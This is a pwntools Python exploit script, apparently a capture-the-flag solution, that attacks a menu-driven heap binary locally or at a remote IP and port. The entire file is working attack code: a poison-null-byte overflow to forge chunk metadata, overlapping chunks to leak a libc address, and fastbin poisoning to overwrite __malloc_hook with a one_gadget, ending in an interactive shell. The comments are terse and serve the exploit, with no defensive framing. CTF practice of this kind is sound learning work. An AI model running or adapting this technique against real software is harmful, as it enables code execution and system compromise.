from pwn import *
elf = ELF('./pwn')

context.arch = 'amd64'
cyberedu = '34.159.85.111:31989'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()


def malloc(size, data):
#select
    p.recvuntil(b": ")
    p.sendline(b"1")
#size
    p.recvuntil(b": ")
    p.sendline(size)
#data
    p.recvuntil(b": ")
    p.send(data)
    
    
    
def free(data_id):
#select
    p.recvuntil(b": ")
    p.sendline(b"2")    
#select ID
    p.recvuntil(b": ")
    p.sendline(data_id)
    
    
    
def show(data_id):
#select
    p.recvuntil(b": ")
    p.sendline(b"3")  
#select ID
    p.recvuntil(b": ")
    p.sendline(data_id)
    
    

#when it loops , it only checks if the 8 bytes at that address are null...

#0x100-8 turns to 0x101 chunk; 248
#0x68 turns to 0x71 chunk; 104
#0x18 turns to 0x21 chunk; 24

#chunk A
malloc(b"248", b"A"*246)
#chunk B
malloc(b"104", b"B"*103)
#chunk C
malloc(b"248", b"C"*247)
#chunk D
malloc(b"24", b"D"*23)

#free chunk A
free(b"0")


#turn chunk C's prev_inuse to 0 
free(b"1")
malloc(b"104", b"B"*104)

#after doing this, the index of chunk B will be 0

#create fake prev_size for chunk C
#first the null bytes
for i in range(1, 7):
    free(b"0")
    malloc(b"104", b"B"*(104-i))
    

free(b"0")
malloc(b"104", b"B"*(104-8)+b"\x70\x01")

#trigger consolidation of chunk C with previous chunk!
free(b"2")
malloc(b"248", b"A"*247)

show(b"0")
p.recvuntil(b": ")

data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))
print(f"leaked fd is {hex(val)}")

leak_offset = 0x3c4b78
libc = val - leak_offset
print(f"leaked libc is {hex(libc)}")
#hope this is the same remotely , lol

#now, let's restore the size of chunk B so it fits back into fastbins
#the chunk A is now stored at index 1
free(b"1")
malloc(b"250", b"E"*250)

free(b"1")
malloc(b"250", b"E"*248+b"\x70")

#free chunk B, then free chunk A/E.

free(b"0")
free(b"1")

#malloc chunk E to overwrite the fd of chunk B. we want that to be find-fake-fast __malloc_hook.

malloc_hook_offset = 0x3c4b10
fake_hook_chunk = libc + malloc_hook_offset - 0x23
malloc(b"264", b"A"*256 + p64(fake_hook_chunk))

#restore chunk B's metadata through chunk E

for i in range(1, 7):
    free(b"0")
    malloc(b"256", b"E"*(256-i))

free(b"0")
malloc(b"250", b"E"*248+b"\x70")

#chunk B
malloc(b"104", b"B"*103)

one_gadget = libc + 0xf02a4

#malloc_hook
malloc(b"104", b"B"*(19) + p64(one_gadget) + b"\x00"*65)

#gdb.attach(p, gdbscript = '''
#b * &__malloc_hook
#c
#''')

#one last malloc
malloc(b"24", b"F"*23)

p.interactive()
